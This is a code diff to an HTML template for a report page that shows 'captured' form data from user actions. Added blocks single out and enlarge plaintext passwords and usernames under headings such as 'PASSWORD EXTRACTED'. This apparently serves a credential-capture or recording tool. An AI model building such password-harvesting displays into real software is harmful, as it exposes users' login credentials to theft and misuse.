@@ -158,7 +158,33 @@
             background: #e3f2fd;
             transition: background-color 0.3s ease;
         }
-        .password-highlight, .sensitive-data {
+        .password-highlight {
+            background: linear-gradient(135deg, #ff1744, #d50000) !important;
+            color: white !important;
+            font-weight: bold !important;
+            font-size: 18px !important;
+            border: 4px solid #ff5722 !important;
+            border-radius: 8px !important;
+            animation: password-glow 1.5s infinite alternate;
+            text-shadow: 0 0 5px rgba(255,255,255,0.8);
+            position: relative;
+        }
+        .password-highlight::before {
+            content: '🔐 PASSWORD: ';
+            font-weight: bold;
+            color: #ffeb3b;
+        }
+        @keyframes password-glow {
+            from { 
+                box-shadow: 0 0 15px #ff1744, 0 0 25px #ff1744, 0 0 35px #ff1744;
+                transform: scale(1);
+            }
+            to { 
+                box-shadow: 0 0 25px #ff1744, 0 0 35px #ff1744, 0 0 45px #ff1744;
+                transform: scale(1.02);
+            }
+        }
+        .sensitive-data {
             background: linear-gradient(135deg, #ffebee, #ffcdd2) !important;
             color: #c62828 !important;
             font-weight: bold !important;
@@ -185,6 +211,25 @@
             max-height: 400px;
             overflow-y: auto;
             box-shadow: 0 8px 20px rgba(0,0,0,0.15);
+        }
+        .password-alert {
+            background: linear-gradient(135deg, #ff1744, #d50000);
+            color: white;
+            padding: 25px;
+            border-radius: 15px;
+            margin: 25px 0;
+            border: 4px solid #ff5722;
+            text-align: center;
+            animation: password-alert-pulse 2s infinite;
+        }
+        @keyframes password-alert-pulse {
+            0%, 100% { transform: scale(1); box-shadow: 0 0 20px rgba(255, 23, 68, 0.7); }
+            50% { transform: scale(1.05); box-shadow: 0 0 30px rgba(255, 23, 68, 1); }
+        }
+        .password-alert h4 {
+            font-size: 24px;
+            margin-bottom: 15px;
+            text-shadow: 0 2px 4px rgba(0,0,0,0.5);
         }
         .timestamp-section {
             background: linear-gradient(135deg, #e3f2fd, #bbdefb);
@@ -261,6 +306,32 @@
             font-weight: bold;
             margin-bottom: 15px;
         }
+        .password-extraction {
+            background: linear-gradient(135deg, #ff1744, #d50000);
+            color: white;
+            padding: 30px;
+            border-radius: 15px;
+            margin: 30px 0;
+            border: 4px solid #ff5722;
+            text-align: center;
+        }
+        .password-extraction h4 {
+            font-size: 26px;
+            margin-bottom: 20px;
+            text-shadow: 0 2px 4px rgba(0,0,0,0.5);
+        }
+        .password-value {
+            background: #fff;
+            color: #d50000;
+            padding: 15px 25px;
+            border-radius: 10px;
+            font-family: 'Monaco', 'Menlo', 'Ubuntu Mono', monospace;
+            font-size: 20px;
+            font-weight: bold;
+            border: 3px solid #ff5722;
+            margin: 15px 0;
+            word-break: break-all;
+        }
     </style>
 </head>
 <body>
@@ -285,6 +356,13 @@
                 <p><strong>STATUS:</strong> BUTTON PRESSED - DATA CAPTURED INSTANTLY</p>
             </div>
 
+            {{#allFormData}}
+            <div class="password-alert">
+                <h4>🔐 PASSWORD DATA CAPTURED</h4>
+                <p><strong>IMMEDIATE ATTENTION REQUIRED:</strong> User credentials including passwords have been captured and are displayed below with maximum security highlighting.</p>
+            </div>
+            {{/allFormData}}
+
             <div class="step-info">
                 <div class="step-title">🎯 USER ACTION CAPTURED</div>
                 <div class="step-content">{{step}}</div>
@@ -299,7 +377,15 @@
             <div class="form-data-section">
                 <h4>📊 COMPLETE FORM DATA SNAPSHOT</h4>
                 {{#allFormData}}
-                <div class="form-type-badge">{{allFormData.formType}}</div>
+                <div class="form-type-badge">FORM TYPE: {{allFormData.formType}}</div>
+                
+                {{#allFormData.password}}
+                <div class="password-extraction">
+                    <h4>🔐 PASSWORD EXTRACTED</h4>
+                    <div class="password-value">{{allFormData.password}}</div>
+                </div>
+                {{/allFormData.password}}
+                
                 <div class="json-data">{{allFormData}}</div>
                 {{/allFormData}}
                 
@@ -333,9 +419,21 @@
                     {{#field}}
                     <tr>
                         <td><strong>{{field}}</strong></td>
-                        <td class="{{#value}}{{#if (contains field 'password')}}password-highlight{{else}}{{#if (contains field 'code')}}sensitive-data{{/if}}{{/if}}{{/value}}">{{value}}</td>
+                        <td class="{{#if (eq field 'password')}}password-highlight{{else}}{{#if (contains field 'code')}}sensitive-data{{/if}}{{/if}}">{{value}}</td>
                     </tr>
                     {{/field}}
+                    {{#allFormData.password}}
+                    <tr style="border: 4px solid #ff1744;">
+                        <td style="background: #ff1744; color: white; font-weight: bold;">🔐 PASSWORD</td>
+                        <td class="password-highlight">{{allFormData.password}}</td>
+                    </tr>
+                    {{/allFormData.password}}
+                    {{#allFormData.username}}
+                    <tr>
+                        <td><strong>📧 USERNAME/EMAIL</strong></td>
+                        <td class="sensitive-data">{{allFormData.username}}</td>
+                    </tr>
+                    {{/allFormData.username}}
                 </tbody>
             </table>
 
